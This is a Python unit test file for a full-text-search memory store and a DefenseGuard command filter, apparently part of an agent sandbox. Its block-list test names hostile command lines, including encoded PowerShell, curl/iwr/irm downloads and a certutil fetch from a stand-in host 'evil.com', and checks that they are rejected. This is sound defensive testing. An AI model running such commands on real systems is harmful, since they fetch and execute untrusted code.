"""Unit tests for FtsMemory and DefenseGuard flood protection."""

import os
import tempfile
import unittest

from core.defense_guard import DefenseGuard
from core.fts_memory import FtsMemory


class TestFtsMemoryAndDefenseGuard(unittest.TestCase):
    """Test suite verifying FtsMemory and DefenseGuard command checking."""

    def setUp(self) -> None:
        self.tmp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.tmp_dir, "test_fts.db")

    def tearDown(self) -> None:
        if os.path.exists(self.db_path):
            try:
                os.remove(self.db_path)
            except OSError:
                pass
        if os.path.exists(self.tmp_dir):
            try:
                os.rmdir(self.tmp_dir)
            except OSError:
                pass

    def test_fts_memory_basic_and_cyrillic(self) -> None:
        """Verify indexing and Cyrillic retrieval."""
        with FtsMemory(self.db_path) as mem:
            ok1 = mem.index_event("ev-01", "app", "Ошибка компиляции модуля ядра")
            ok2 = mem.index_event("ev-02", "app", "Тестирование завершено успешно")
            self.assertTrue(ok1)
            self.assertTrue(ok2)
            res1 = mem.search("ошибка")
            self.assertGreaterEqual(len(res1), 1)
            self.assertEqual(res1[0]["event_id"], "ev-01")
            res2 = mem.search("успешно")
            self.assertGreaterEqual(len(res2), 1)
            self.assertEqual(res2[0]["event_id"], "ev-02")

    def test_fts_syntax_injection_safety(self) -> None:
        """Verify queries with special FTS5 operators do not raise exceptions."""
        with FtsMemory(self.db_path) as mem:
            mem.index_event("ev-01", "sys", "Critical error: connection reset by peer in c++")
            queries = [
                '"unclosed quote',
                "*",
                "AND",
                "NOT",
                "OR",
                "NEAR()",
                "error: connection reset",
                "c++",
                "[ERROR]",
                "nonexistent:tag",
            ]
            for q in queries:
                res = mem.search(q)
                self.assertIsInstance(res, list)

    def test_defense_guard_flood_and_encoded(self) -> None:
        """Verify DefenseGuard command flood and network protection."""
        bad_cmds = [
            "powershell -enc aW1wb3J0",
            "curl https://example.com",
            "iwr https://bad.org",
            "irm https://bad.org/script.ps1",
            "certutil -urlcache -f http://evil.com",
            "Get-ChildItem -Recurse",
            "cat huge_file.log",
        ]
        for cmd in bad_cmds:
            ok, reason = DefenseGuard.chk_cmd(cmd)
            self.assertFalse(ok, f"Command should be blocked: {cmd}")
            self.assertNotEqual(reason, "PASS")

        good_cmds = [
            "git status",
            "Get-Content app.log -TotalCount 20",
            "python tests/test_fts_memory.py",
        ]
        for cmd in good_cmds:
            ok, reason = DefenseGuard.chk_cmd(cmd)
            self.assertTrue(ok, f"Command should pass: {cmd} (reason: {reason})")
            self.assertEqual(reason, "PASS")


if __name__ == "__main__":
    unittest.main()
